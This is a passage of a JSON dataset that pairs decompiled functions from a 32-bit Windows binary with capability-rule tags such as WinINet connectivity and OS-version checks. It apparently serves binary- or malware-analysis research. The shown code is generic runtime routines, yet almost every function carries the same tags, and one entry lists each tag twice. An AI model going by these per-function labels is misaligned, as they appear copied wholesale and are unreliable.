            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041bfa8(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x485864 == 0) {\n        *0x485864 = fcn.004037f0();\n    }\n    iVar1 = fcn.0041c52c();\n    if (iVar1 < 0) {\n        fcn.0041c358();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0041bfe8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041bfe8(void)\n\n{\n    if (*0x485864 != 0) {\n        fcn.0041c688();\n    }\n    return;\n}\n",
        "token_count": 40
    },
    "0041c000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041c000(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x485864 != 0) && (iVar3 = *(*0x485864 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.0041c4c8();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 152
    },
    "0041c040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041c040(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x485850 != NULL) {\n        uVar1 = (**0x485850)();\n        return uVar1;\n    }\n    uVar1 = fcn.0041c000();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 85
    },
    "0041c170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c170(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.004069e0();\n    fcn.00403820();\n    iVar1 = fcn.004069e0();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.0041c5b8();\n    iVar3 = fcn.004069e0();\n    *(iVar3 + 8) = uVar2;\n    fcn.0041c3a4();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.004069e0();\n        *(iVar1 + 0xc) = 0;\n        fcn.00403820();\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "0041c274": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c274(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x41c28a;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x48584c + 0x14))();\n    uStack24 = 0x41c322;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x41c334 == (*(var_4h + 0x1c) & *0x41c330);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x41c2bf;\n        puStack20 = &stack0xfffffffc;\n        fcn.0041c0e8();\n    }\n    uStack36 = 0x41c303;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00403764();\n    var_9h = fcn.0041c1cc(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.0041c140();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c30a;\n    if (var_ah != '\\0') {\n        uStack36 = 0x41c302;\n        fcn.0041c170();\n    }\n    return;\n}\n",
        "token_count": 452
    },
    "0041c3a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c3a4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.0041c444(param_1);\n    }\n    iVar1 = fcn.0041c4c8();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.00402d34();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0041c62c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c62c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.0041c444(param_1);\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    if (param_1 != iVar1) {\n        *(in_EAX[1] + param_2 * 4) = param_1;\n        if (iVar1 != 0) {\n            (**(*in_EAX + 4))();\n        }\n        if (param_1 != 0) {\n            (**(*in_EAX + 4))();\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0041c828": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c828(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x41c83a;\n    fcn.0041c8b0();\n    uStack20 = 0x41c8a4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.0041c52c();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.0041c444();\n            }\n            goto code_r0x0041c88e;\n        }\n    }\n    fcn.0041c358();\ncode_r0x0041c88e:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41c8ab;\n    uStack20 = 0x41c8a3;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 299
    },
    "0041c974": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c974(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.0041c950(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar2 = (iVar1 >> 5) << 2;\n        iVar1 = *(in_EAX + 4) + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) << 2;\n        if (iVar1 != iVar2) {\n            iVar3 = 0;\n            if (iVar2 != 0) {\n                iVar3 = fcn.00402b14();\n                fcn.004031a8();\n            }\n            if (iVar1 != 0) {\n                if (iVar3 != 0) {\n                    fcn.0041c968();\n                    fcn.00402d34();\n                }\n                fcn.00402b44();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "0041ca18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ca18(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040c998();\n            fcn.00403fc0();\n            return;\n        }\n        fcn.0041c974();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 216
    },
    "0041cbd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041cc41)\n\nvoid fcn.0041cbd8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x41cc6d;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403770();\n    fcn.0040482c();\n    iVar1 = fcn.00403a28();\n    if (iVar1 != 0) {\n        fcn.00403a28();\n        fcn.00403a28();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.004045c8(0x41cc74);\n    return;\n}\n",
        "token_count": 221
    },
    "0041cde4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ce17)\n\nvoid fcn.0041cde4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41ce39;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00406298();\n    fcn.0041cd44();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41ce40;\n    uStack28 = 0x41ce38;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 172
    },
    "0041ceb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ceb0(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    piVar1 = *(in_EAX + 4);\n    if ((piVar1 != NULL) && (piVar1[3] == 0)) {\n        (**(*piVar1 + 0x1c))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0041cf14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cf14(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x41cfa9;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    if (*(in_EAX + 4) == 0) {\n        fcn.00403770();\n        param_2 = 0x41cf93;\n        fcn.0040482c();\n    }\n    else {\n        puStack296 = &stack0xfffffffc;\n        fcn.00403a28();\n        fcn.0041ced4();\n        fcn.00409998(param_2);\n    }\n    *in_FS_OFFSET = param_2;\n    uStack300 = 0x41cfb0;\n    uStack304 = 0x41cfa8;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 284
    },
    "0041d180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d180(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[3] == 0) {\n        (**(*in_EAX + 0x1c))();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0041d190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d190(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x41d1ac;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x41d1ea;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.0041c5b8();\n            fcn.00403820();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d1f1;\n        uStack20 = 0x41d1e9;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0041d250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d2bc)\n// WARNING: Removing unreachable block (ram,0x0041d2cc)\n\nvoid fcn.0041d250(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed0;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x41d2fe;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00403770();\n    fcn.0040482c();\n    iVar1 = fcn.00403a28();\n    if (iVar1 != 0) {\n        fcn.00403a28();\n        fcn.00403a28();\n    }\n    *in_FS_OFFSET = in_stack_fffffed0;\n    fcn.004045ec(0x41d305);\n    return;\n}\n",
        "token_count": 245
    },
    "0041d318": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d318(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = 0x41d335;\n    fcn.0040461c();\n    puStack40 = 0x41d341;\n    iVar1 = fcn.00403a28();\n    if ((*param_2 == 0) && (iVar1 != 0)) {\n        puStack40 = 0x41d364;\n        iVar1 = fcn.00403a6c();\n        if (iVar1 != 0) {\n            puStack40 = 0x41d376;\n            fcn.00403a6c();\n            puStack40 = 0x41d37b;\n            iVar1 = fcn.00418374();\n            if ((iVar1 != 0) && (*(iVar1 + 8) != 0)) {\n                puStack40 = 0x41d3a5;\n                iVar2 = fcn.00402b14();\n                uStack44 = 0x41d421;\n                uStack48 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd0;\n                puStack40 = &stack0xfffffffc;\n                fcn.00403a6c();\n                fcn.004185e8();\n                iVar1 = *(iVar1 + 8);\n                if (-1 < iVar1 + -1) {\n                    iVar4 = 0;\n                    do {\n                        if (****(iVar2 + iVar4 * 4) == '\\a') {\n                            iVar3 = fcn.0041863c();\n                            if (iVar3 == in_EAX) {\n                                fcn.0040482c();\n                            }\n                        }\n                        iVar4 = iVar4 + 1;\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n                *in_FS_OFFSET = uStack48;\n                puStack40 = 0x41d428;\n                uStack44 = 0x41d420;\n                fcn.00402b44();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "0041d740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d740(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[2] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[2] = in_EAX[2] + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "0041d7fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d7fc(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[2] = in_EAX[2] + -1;\n    if (in_EAX[2] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0041e0d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041e0d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x10))();\n    }\n    fcn.004062b0();\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0041e15c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e15c(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41e226;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41e187;\n    fcn.0041d740();\n    uStack48 = 0x41e209;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    var_8h = param_2;\n    if (param_2 != NULL) {\n        while (*var_8h != '\\0') {\n            for (; ((cVar1 = *var_8h,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); var_8h = var_8h + 1) {\n            }\n            fcn.004046b8();\n            (**(*in_EAX + 0x38))();\n            if (*var_8h == '\\r') {\n                var_8h = var_8h + 1;\n            }\n            if (*var_8h == '\\n') {\n                var_8h = var_8h + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41e210;\n    uStack48 = 0x41e208;\n    fcn.0041d7fc();\n    return;\n}\n",
        "token_count": 455
    },
    "0041e6bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e6bc(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 7) != '\\0') {\n        fcn.0041d8f4();\n    }\n    if ((in_EDX < 0) || (in_EAX[5] < in_EDX)) {\n        fcn.0041d8f4();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 123
    },
    "0041ea28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ea28(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041ea40:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041ea6a;\n            }\n            else if (arg_ch < 1) goto code_r0x0041ea6a;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041ea40;\n    fcn.0040c998();\n    fcn.00403fc0();\n    in_EAX = extraout_ECX;\ncode_r0x0041ea6a:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 214
    },
    "0041eac8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041eac8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00403764();\n    while ((var_20h != 0 && (var_20h != *0x41a544))) {\n        var_20h = fcn.004037ac();\n    }\n    if (var_20h == 0) {\n        fcn.0041ea7c(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041ea7c(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 290
    },
    "0041eb4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041eb4c(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041eb6b:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041eb95;\n            }\n            else if (arg_ch < 1) goto code_r0x0041eb95;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041eb6b;\n    fcn.0040c998();\n    fcn.00403fc0();\ncode_r0x0041eb95:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 224
    },
    "0041ec2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec2c(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41ec51;\n        fcn.0041e9b0(0, 0);\n        uStackY52 = 0x41ec57;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041ec85:\n            var_14h = arg_8h;\n            goto code_r0x0041ec8b;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041ec85;\n    var_14h = 0xf000;\ncode_r0x0041ec8b:\n    fcn.00402b14();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402b44();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041ecbd:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041ecbd;\n        fcn.0041ebbc();\n        fcn.0041ebf4();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 548
    },
    "0041ee88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
